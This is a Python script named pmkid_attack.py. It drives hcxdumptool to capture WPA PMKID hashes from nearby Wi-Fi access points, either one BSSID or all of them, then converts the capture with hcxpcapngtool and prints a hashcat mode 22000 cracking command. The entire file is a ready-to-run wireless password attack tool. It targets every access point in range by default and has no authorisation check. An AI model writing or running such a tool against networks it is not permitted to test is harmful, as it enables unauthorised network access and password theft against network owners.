# language: Python 3, file: pmkid_attack.py, target: Linux (requires hcxdumptool + hcxtools + root)
# Orchestrates PMKID capture (no handshake needed) using hcxdumptool, then converts for hashcat.
# PMKID attack does not require any client to be connected to the AP.
import subprocess
import sys
import os

def run(cmd, shell=False):
    print(f"[>] {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    subprocess.run(cmd, shell=shell, check=True)

def main():
    iface = input("Interface (monitor mode or managed — hcxdumptool handles it): ").strip()
    bssid = input("Target BSSID (or leave blank for all): ").strip()
    outfile = input("Output file prefix (ex: pmkid_cap): ").strip() or "pmkid_cap"
    pcapng = outfile + ".pcapng"
    hashfile = outfile + ".22000"

    filter_arg = [f"--filterlist_ap={bssid}", "--filtermode=2"] if bssid else []
    print("[*] Capturing PMKID — Ctrl+C after a few seconds on each AP...")
    try:
        run(["hcxdumptool", "-i", iface, "-o", pcapng] + filter_arg)
    except KeyboardInterrupt:
        pass
    except subprocess.CalledProcessError as e:
        print(f"[!] hcxdumptool error: {e}")
        sys.exit(1)

    print("[*] Converting to hashcat format...")
    run(["hcxpcapngtool", "-o", hashfile, pcapng])

    print(f"[+] Hash file: {hashfile}")
    print(f"[*] Crack with: hashcat -m 22000 {hashfile} wordlist.txt")

if __name__ == "__main__":
    main()
